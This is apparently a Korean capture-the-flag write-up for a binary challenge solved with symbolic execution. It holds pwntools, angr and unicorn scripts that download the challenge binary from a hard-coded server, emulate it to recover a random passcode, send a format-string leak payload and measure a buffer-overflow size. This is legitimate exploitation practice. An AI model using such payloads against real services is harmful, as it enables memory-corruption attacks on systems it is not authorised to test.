#symbolic_excution

## 개요
 - 출제자의 문제 비공개 요청으로인하여 소스코드 분석 및 상세사항은 기재하지 않았습니다..

## Symbolic_excution?
<img width="677" alt="image" src="https://github.com/ChCh0i/steel/assets/108965611/c6c43f2d-0d34-48ca-9da9-5a9de800b050">

 - symbolic_execution  = 기호 실행

 - 상세 개요는 다음과 같습니다.
 - 정적인 code상 분기점 cmp를 만나여 연산을 진행할경우 ```true``` & ```false``` 로 분기하게 됩니다.
 - 해당 코드의 분기점을 진행할때 가상의 symbol을 생성하여 aviod 와 찾을 find 함수를 지정하여 해당 값에 도달하게될 경우의수를 찾아 execution하게됩니다.
 - 간단하게 설명드린 내용이며 상세 내용은 직접 찾아 보시길 바랍니다.


## code 의 흐름도

 - 제공받은 파일의 흐름은 nc로 해당 문제 서버 접속시 crypt된 hex(passcode)와 binary elf 파일을 base64로 패킹된 텍스트를 제공 받았습니다.
 - exploit은 urandom으로 랜덤하게 생성된 passcode를 암호화 루틴을 symbolic execution으로 passcode를 자동화 하여 입력하면 풀리는 문제였습니다.
## Protect
<img width="446" alt="image" src="https://github.com/ChCh0i/steel/assets/108965611/44b24059-5248-44b6-ab86-c02568adec28">
<img width="566" alt="image" src="https://github.com/ChCh0i/steel/assets/108965611/5cd1f310-a929-413c-b573-e58153c5ae8b">

 - Pie(position-independent code) 위치 독립적 코드가 설정되어있어 libc 등 함수를 호출할때 mapping되는 주소가 유동적으로 변합니다.
 - 그리고 strip 이 설정되어있어 symbol도 없다는것을 알수있습니다.


## exploit
base64 > binary.gz > binary > chmod 777
```
from pwn import *
import base64
import os
import gzip

text = []
ind = 1
file_name = f'./decoded_file{ind}.gz'
out_name = f'./decoded_file{ind}'

r = remote("172.233.81.34", 11111)

r.recvuntil(b"BINARY-----\n")
for _ in range(10):
    text.append(r.recv(30000).decode('utf-8'))

result = ''.join(text)
index_f = result.find('-----END SPERMAEG BINARY-----')
result = result[:index_f]

decoded_data = base64.b64decode(result)
print(decoded_data)

with open(file_name, 'wb') as f:
    f.write(decoded_data)

with gzip.open(file_name, 'rb') as f_in:
    decompressed_data = f_in.read()

os.remove(file_name)

with open(out_name, 'wb') as f_out:
    f_out.write(decompressed_data)

os.chmod(out_name, 0o777)

print(f'Decompressed file saved to: {out_name}')
```

```
import angr
from unicorn import *
from pwn import *
from unicorn.x86_const import *

def bof_addr(proj,addr: int):
    block = proj.factory.block(addr+0x14d)

    for insn in block.capstone.insns:
        print(f'bof_addr: {insn}')
        return int(insn.op_str,16)

def fsb_addr(proj,addr: int):
    block = proj.factory.block(addr+0x159)

    for insn in block.capstone.insns:
        print(f'fsb_addr: {insn}')
        return int(insn.op_str,16)

def my_code_hook(uc: Uc, address: int, size: int, user_data):
    BASE_ADDR = 0x400000
    if address == BASE_ADDR + 0x172f:
        uc.reg_write(UC_X86_REG_RAX, user_data['passcode'])


def my_invalid_mem_hook(mu: Uc, access, address: int, *_):
    print("--- invalid:")
    print(hex(address))
    print("--- regs:")
    print(f"RAX: {mu.reg_read(UC_X86_REG_RAX):016x}")
    print(f"RBX: {mu.reg_read(UC_X86_REG_RBX):016x}")
    print(f"RCX: {mu.reg_read(UC_X86_REG_RCX):016x}")
    print(f"RDX: {mu.reg_read(UC_X86_REG_RDX):016x}")
    print(f"RDI: {mu.reg_read(UC_X86_REG_RDI):016x}")
    print(f"RSI: {mu.reg_read(UC_X86_REG_RSI):016x}")
    print(f"R8 : {mu.reg_read(UC_X86_REG_R8):016x}")
    print(f"R9 : {mu.reg_read(UC_X86_REG_R9):016x}")
    print(f"R10: {mu.reg_read(UC_X86_REG_R10):016x}")
    print(f"R11: {mu.reg_read(UC_X86_REG_R11):016x}")
    print(f"R12: {mu.reg_read(UC_X86_REG_R12):016x}")
    print(f"R13: {mu.reg_read(UC_X86_REG_R13):016x}")
    print(f"R14: {mu.reg_read(UC_X86_REG_R14):016x}")
    print(f"R15: {mu.reg_read(UC_X86_REG_R15):016x}")
    print(f"RSP: {mu.reg_read(UC_X86_REG_RSP):016x}")
    print(f"RBP: {mu.reg_read(UC_X86_REG_RBP):016x}")
    print(f"RIP: {mu.reg_read(UC_X86_REG_RIP):016x}")

def nop_patch(mu: Uc, addr: int, len: int):
    for i in range(len):
        mu.mem_write(addr + i, b'\x90')

def fetch_BOF(proj, BOF_CALLER_FUNC: int):
    block = proj.factory.block(BOF_CALLER_FUNC)
    total = 0
    read_rdx = 0
    for insn in block.capstone.insns:
        print(f'BOF insns : {insn}')
        if insn.mnemonic == "sub":
            rsp,ind = insn.op_str.split(",")
            total += int(ind,16)
            # print(insn.op_str[0:3])
            # print(hex(total))
        elif insn.mnemonic == "call":
            wr = fetch_write(proj,BOF_CALLER_FUNC+0x34)
    return wr+total

def fetch_write(proj, WRITE_CALLER_FUNC: int):
    block = proj.factory.block(WRITE_CALLER_FUNC)

    for insn in block.capstone.insns:
        print(f'write insns : {insn}')
        if insn.op_str[0:3] == 'edx':
            ind = int(insn.op_str[5:],16)
            return ind

def main(args):


    context.log_level = 'debug'

    p = process(args.binary)
    p.recvuntil(b"passcode is ")
    pwnpasscode = int(p.recvuntil("\n")[:-1], 16)
    print("[+] Binary Passcode is", hex(pwnpasscode))

    proj = angr.Project(args.binary, auto_load_libs=False)
    state = proj.factory.entry_state()
    simgr = proj.factory.simgr(state)

    STACK_TOP    = 0x7fff0000
    STACK_BOTTOM = 0x7ffff000
    BASE_ADDR = 0x400000
    CURRENT_ADDR = BASE_ADDR+0x171E

    while True:
        block = proj.factory.block(CURRENT_ADDR)
        opcode = block.bytes
        # print(f'opcode : {opcode}')
        ALL_DUMP = opcode
        # print(f'all_dump : {ALL_DUMP}')

        if b'\xe8' in opcode: # CALL
            # print(f'0xe8 in {opcode}')
            for insn in block.capstone.insns:
                print(f'insns : {insn}')
                if insn.mnemonic == "call":
                    # CALL_FUNC_ADDRESS.append(insn.address)
                    # print(insn.op_str)
                    CALL_ARG = int(insn.op_str, 16) 
                    print(f'call arg : {hex(CALL_ARG)}')
                    # if CALL_ARG not in CALL_FUNC: break

                    # print("CALL: ", hex(CALL_ARG))
                    DUMP = b""

                    if not os.path.isfile(f"./test/{args.binary}_{hex(CALL_ARG)}"):
                        with open(f"./test/{args.binary}_{hex(CALL_ARG)}", "wb") as f:
                            while True:
                                inner_block = proj.factory.block(CALL_ARG)
                                inner_opcode = inner_block.bytes

                                if b'\x5d\xc3' in inner_opcode: #pop rbp; ret
                                    DUMP += inner_opcode

                                    # print("[+] NOW DUMP IS")
                                    # print(hexdump(DUMP))
                                    f.write(DUMP)
                                    break

                                DUMP += inner_opcode
                                CALL_ARG = inner_block.addr + inner_block.size

                    DUMP = b""
        
        if b'\xc9\xc3' in opcode:  # '\xc9' is the opcode for the 'leave' instruction
            LAST_FUNC_ADDR = CURRENT_ADDR
            # print(f'Found "leave" instruction at block starting at address {hex(CURRENT_ADDR)}')
            break

        CURRENT_ADDR = block.addr + block.size
    
    with open(f"./test/{args.binary}_{hex(CURRENT_ADDR)}", "wb") as f:
        f.write(ALL_DUMP)
        # print(hexdump(ALL_DUMP))

    # unicorn
    mu = Uc(UC_ARCH_X86, UC_MODE_64)
    mu.mem_map(STACK_TOP, STACK_BOTTOM - STACK_TOP) # stack은 아래에서 위로
    mu.mem_map(BASE_ADDR, 0x10000)


    for file in os.listdir("./test/"):
        with open(f"./test/{file}", 'rb') as f:
            data = f.read()
            # print(hexdump(data))
            addr = int(file.split("_")[1], 16)
            # print(hex(addr))
            mu.mem_write(addr, data)

    MAIN_ADDR = BASE_ADDR + 0x1249
    BOF_CALLER_FUNC = bof_addr(proj,MAIN_ADDR)
    FSB_CALLER_FUNC = fsb_addr(proj,MAIN_ADDR)

    print(hex(BOF_CALLER_FUNC))
    print(hex(FSB_CALLER_FUNC))
    # BOF_CALLER_FUNC = BASE_ADDR + 0x8648
    # FSB_CALLER_FUNC = BASE_ADDR + 0x8698
    
    BOF_SZ = fetch_BOF(proj, BOF_CALLER_FUNC)
    print("[*] BOF SZ: ", BOF_SZ, hex(BOF_SZ))

    # with open("./sample1", "rb") as f:
    #     data = f.read()
    #     mu.mem_write(BASE_ADDR, data)

    mu.reg_write(UC_X86_REG_RIP, BASE_ADDR + 0x171e)
    mu.reg_write(UC_X86_REG_RSP, STACK_BOTTOM - 0x1000)
    mu.reg_write(UC_X86_REG_RBP, STACK_BOTTOM - 0x900)

    
    # print(mu.mem_read(BASE_ADDR + 0x172f, 5))
    # print(mu.mem_read(BASE_ADDR + 0x174d, 5))

    # nop patch
    nop_patch(mu, BASE_ADDR + 0x172f,5)
    nop_patch(mu, BASE_ADDR + 0x174d,5)
    
    # print(mu.mem_read(BASE_ADDR + 0x172e, 5))
    # print(mu.mem_read(BASE_ADDR + 0x174d, 5))


    # print("MEMORY WRITE END\n> ")

    mu.hook_add(UC_HOOK_CODE, my_code_hook, {'passcode': pwnpasscode}, BASE_ADDR + 0x172f, BASE_ADDR + 0x1734)
    mu.hook_add(UC_HOOK_MEM_INVALID, my_invalid_mem_hook)
    # mu.hook_add(UC_HOOK_MEM_READ_UNMAPPED | UC_HOOK_MEM_WRITE_UNMAPPED, hook_mem_invalid)
    # mu.hook_add(UC_HOOK_MEM_WRITE, hook_mem_access)
    # mu.hook_add(UC_HOOK_MEM_READ, hook_mem_access)
    
    mu.emu_start(begin=(BASE_ADDR + 0x171e), until=(LAST_FUNC_ADDR))

    Rpasscode = mu.reg_read(UC_X86_REG_AX)
    print("[+] PASSCODE IS : ", end="")
    print(hex(Rpasscode))
    print(hexdump(mu.reg_read(UC_X86_REG_AX)))
    p.recvuntil(b"passcode: ")
    p.send(p16(Rpasscode))

    p.recvuntil(b"> ")
    p.send(p32(2)) 

    #get fsb buffer size

    p.recvuntil(b"FSB: ")
    # p.send(b"AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p")
    p.send(b"AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p")
    
    fmt_str_bugs = p.recvuntil(b'>')

    print("[+] Answer is ", fmt_str_bugs)
    fmt_str_bugs = fmt_str_bugs.split(".")

    for i in fmt_str_bugs:
        print(i)
    


    p.interactive()


if __name__ == "__main__":
    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument("binary")
    args = parser.parse_args()
    main(args)
```
